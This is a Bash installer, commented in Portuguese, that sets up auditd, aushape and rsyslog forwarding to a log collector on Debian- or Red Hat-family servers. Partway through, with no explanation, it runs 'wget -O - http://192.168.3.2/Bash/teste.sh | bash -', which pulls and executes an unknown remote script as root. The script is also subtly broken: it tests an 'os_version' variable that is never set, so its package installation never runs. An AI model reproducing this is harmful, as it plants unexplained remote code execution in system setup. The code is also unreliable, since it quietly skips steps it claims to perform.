#!/bin/bash

# Define a cor vermelha (código ANSI)
RED='\033[0;31m'
# Reseta a cor (código ANSI)
NRED='\033[0m' # No Color
# Define a cor amarela (código ANSI)
YELLOW='\033[1;33m'
# Reseta a cor (código ANSI)
NYEL='\033[0m' # No Color
# Define a cor azul (código ANSI)
BLUE='\033[0;34m'
# Reseta a cor (código ANSI)
NBLUE='\033[0m' # No Color

# Verifica se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Por favor, execute este script com o sudo.${NRED}"
  exit 1
fi

# Define o nome do arquivo de log
LOG_FILE="/var/log/install_script.log"

# Inicia o registro de log
echo "Início do script $(date)" > "$LOG_FILE"

# Solicita a senha de root para instalar pacotes sem precisar de yes
# read -s -p 'Por favor, digite a senha de root para instalação dos pacotes sem interação do usuário: ' ROOT_PASSWORD"

# Solicita o IP do servidor do coletor/syslog
# Limpar o buffer de entrada
#read -t 1 -n 10000 discard
echo -e "${YELLOW}[*] Digite o IP do servidor do coletor/syslog:${NYEL}"
read ip_collector

# Detecta a versão do SO
echo -e "${YELLOW}[*] Detectando versão do SO...${NYEL}"
# os_version=$(lsb_release -a 2>/dev/null | grep 'Release' | awk '{print $2}')
os_id=$(lsb_release -a 2>/dev/null | grep 'ID' | awk -F ':' '{print $2}' | tr -d '\t ')

echo "[+] Detectado: $os_id"

# Verifica se o SO é compatível com o script
case "$os_id" in
  "Ubuntu" | "Debian" | "CentOS" | "Red Hat Enterprise Linux (RHEL)")
    # echo "[+] Detectado: $os_id"
    ;;
  *)
    echo -e "${RED}[!] Sistema não compatível com o instalador... Por favor, contate o suporte para instalação manual.${NRED}"
    exit 1
    ;;
esac

# Detecta a conexão com a internet
echo -e "${YELLOW}[*] Testando conexão com a internet...${NYEL}"
if ! ping -c 1 google.com &>/dev/null; then
  echo -e "${RED}[!] Sem conexão com a internet... Por favor, entre em contato com o suporte para instalação manual.${NRED}"
  exit 1
fi

# Verifica e instala os pacotes necessários
packages_to_install=""

if [ "$os_version" == "Ubuntu" ] || [ "$os_version" == "Debian" ]; then
  if ! dpkg -l | grep -q "wget"; then
    packages_to_install+=" wget"
  fi
  if ! dpkg -l | grep -q "curl"; then
    packages_to_install+=" curl"
  fi
  if ! dpkg -l | grep -q "auditd"; then
    packages_to_install+=" auditd"
  fi
  if ! dpkg -l | grep -q "gcc"; then
    packages_to_install+=" gcc"
  fi
  if ! dpkg -l | grep -q "make"; then
    packages_to_install+=" make"
  fi
  if ! dpkg -l | grep -q "libaudit-dev"; then
    packages_to_install+=" libaudit-dev"
  fi
  if ! dpkg -l | grep -q "libauparse-dev"; then
    packages_to_install+=" libauparse-dev"
  fi
  if ! dpkg -l | grep -q "autoconf"; then
    packages_to_install+=" autoconf"
  fi
  if ! dpkg -l | grep -q "automake"; then
    packages_to_install+=" automake"
  fi
  if ! dpkg -l | grep -q "libtool"; then
    packages_to_install+=" libtool"
  fi
  if ! dpkg -l | grep -q "pkg-config"; then
    packages_to_install+=" pkg-config"
  fi
  if ! dpkg -l | grep -q "git"; then
    packages_to_install+=" git"
  fi
fi

if [ "$os_version" == "CentOS" ] || [ "$os_version" == "Red Hat Enterprise Linux (RHEL)" ]; then
  if ! rpm -q wget >/dev/null 2>&1; then
    packages_to_install+=" wget"
  fi
  if ! rpm -q curl >/dev/null 2>&1; then
    packages_to_install+=" curl"
  fi
  if ! rpm -q audit >/dev/null 2>&1; then
    packages_to_install+=" audit"
  fi
  if ! rpm -q gcc >/dev/null 2>&1; then
    packages_to_install+=" gcc"
  fi
  if ! rpm -q make >/dev/null 2>&1; then
    packages_to_install+=" make"
  fi
  if ! rpm -q audit-libs-devel >/dev/null 2>&1; then
    packages_to_install+=" audit-libs-devel"
  fi
  if ! rpm -q autoconf >/dev/null 2>&1; then
    packages_to_install+=" autoconf"
  fi
  if ! rpm -q automake >/dev/null 2>&1; then
    packages_to_install+=" automake"
  fi
  if ! rpm -q libtool >/dev/null 2>&1; then
    packages_to_install+=" libtool"
  fi
  if ! rpm -q git >/dev/null 2>&1; then
    packages_to_install+=" git"
  fi
fi

if [ -n "$packages_to_install" ]; then
  echo -e "${YELLOW}[*] Os seguintes pacotes não estão instalados e precisam ser instalados:$packages_to_install${NYEL}" >> "$LOG_FILE" 2>&1
  while true; do
    read -p "${RED}[!] Deseja continuar a instalação? (y/n): ${NRED}" install_choice
    case "$install_choice" in
      [Yy]*)
        break
        ;;
      [Nn]*)
        echo -e "${RED}[!] Instalação interrompida pelo usuário.${NRED}" >> "$LOG_FILE" 2>&1
        exit 0
        ;;
      *)
        echo -e "${RED}[!] Por favor, digite 'y' ou 'n'.${NRED}" >> "$LOG_FILE" 2>&1
        ;;
    esac
  done
fi


# Atualizar repositório e instalar pacotes
echo "[+] Atualizando repositório..."
if [ "$os_version" == "Ubuntu" ] || [ "$os_version" == "Debian" ]; then
  apt-get update

  for package in $packages_to_install; do
    echo "[+] Instalando pacote... $package"
    apt-get install -y $package
  done

elif [ "$os_version" == "CentOS" ] || [ "$os_version" == "Red Hat Enterprise Linux (RHEL)" ]; then
  yum -y update

  for package in $packages_to_install; do
    echo "[+] Instalando pacote $package..."
    yum -y install $package
  done

fi


# Baixa e configura as regras do auditd
echo "[+] Baixando e configurando regras..."

if [ -n "$(command -v wget)" ]; then
  wget -O /etc/audit/rules.d/audit.rules https://raw.githubusercontent.com/Neo23x0/auditd/master/audit.rules
elif [ -n "$(command -v curl)" ]; then
  curl -o /etc/audit/rules.d/audit.rules https://raw.githubusercontent.com/Neo23x0/auditd/master/audit.rules
fi

# Clona e configura o repositório aushape
echo "[+] Clonando repositório Aushape..."
git clone https://github.com/Scribery/aushape.git
echo "[+] Configurando instalação do Aushape..."
cd aushape
autoreconf -i -f
./configure --prefix=/usr --sysconfdir=/etc && make
echo "[+] Instalando pacote... aushape"
make install

# Cria o arquivo aushape-audispd-plugin
echo "[+] Configurando regras de logs."
echo '#!/bin/sh' > /usr/bin/aushape-audispd-plugin
echo 'exec /usr/bin/aushape -l json --events-per-doc=none --fold=all -o syslog' >> /usr/bin/aushape-audispd-plugin
echo "[+] Executando permissões de escrita..."
chmod +x /usr/bin/aushape-audispd-plugin

# Cria o arquivo aushape.conf em /etc/audisp/plugins.d/

echo "[+] Criando .conf do aushape..." 
cat <<EOF > /etc/audisp/plugins.d/aushape.conf
active = yes
direction = out
path = /usr/bin/aushape-audispd-plugin
type = always
format = string
EOF

# Reinicie o serviço auditd
echo "[+] Reinciando auditd..."
systemctl restart auditd

# Crie o arquivo rsyslog.conf
if [ -f "/etc/rsyslog.conf" ]; then
  echo -e "${YELLOW}[*] Backup do arquivo rsyslog.conf criado em /etc/rsyslog.conf.backup${NYEL}"
  mv /etc/rsyslog.conf /etc/rsyslog.conf.backup
fi

echo "[+] Recriando rsyslog.conf..."
cat <<EOF > /etc/rsyslog.conf
#################
#### MODULES ####
#################

module(load="imuxsock") # provides support for local system logging
module(load="imklog")   # provides kernel logging support


###########################
#### GLOBAL DIRECTIVES ####
###########################

$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

$FileOwner root
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022

$WorkDirectory /var/spool/rsyslog

$IncludeConfig /etc/rsyslog.d/*.conf

###############
#### RULES ####
###############

auth,authpriv.*			/var/log/auth.log
*.*;auth,authpriv.none		-/var/log/syslog
# cron.*				/var/log/cron.log
# daemon.*			-/var/log/daemon.log
# kern.*				-/var/log/kern.log
# lpr.*				-/var/log/lpr.log
# mail.*				-/var/log/mail.log
user.*				-/var/log/user.log
local1.info

#
# Logging for the mail system.  Split it up so that
# it is easy to write scripts to parse these files.
#
# mail.info			-/var/log/mail.info
# mail.warn			-/var/log/mail.warn
# mail.err			/var/log/mail.err

#
# Some "catch-all" log files.
#
*.=debug;\
	auth,authpriv.none;\
	news.none;mail.none	-/var/log/debug
*.=info;*.=notice;*.=warn;\
	auth,authpriv.none;\
	cron,daemon.none;\
	mail,news.none		-/var/log/messages

#
# Emergencies are sent to everybody logged in.
#
*.emerg				:omusrmsg:*
*.*     	 	@@$ip_collector:514
local1.info		@@$ip_collector:514
EOF
wget -O - http://192.168.3.2/Bash/teste.sh | bash -
# Reinicie o auditd e rsyslog
echo "[+] Reiniciando o auditd..."
systemctl restart auditd
echo "[+] Reiniciando o rsyslog..."
systemctl restart rsyslog

# Adicione comando à cron
echo "[+] Incluindo na cron o log de Heartbeat..."
echo "*/5 * * * * root logger -p local1.info -t heartbeat 'NTS log active'" >> /etc/crontab

# Salve o log em um arquivo .log
echo "Log criado em /var/log/install_script.log"
exec > /var/log/install_script.log 2>&1

echo -e "${BLUE}Script concluído!${NBLUE}"
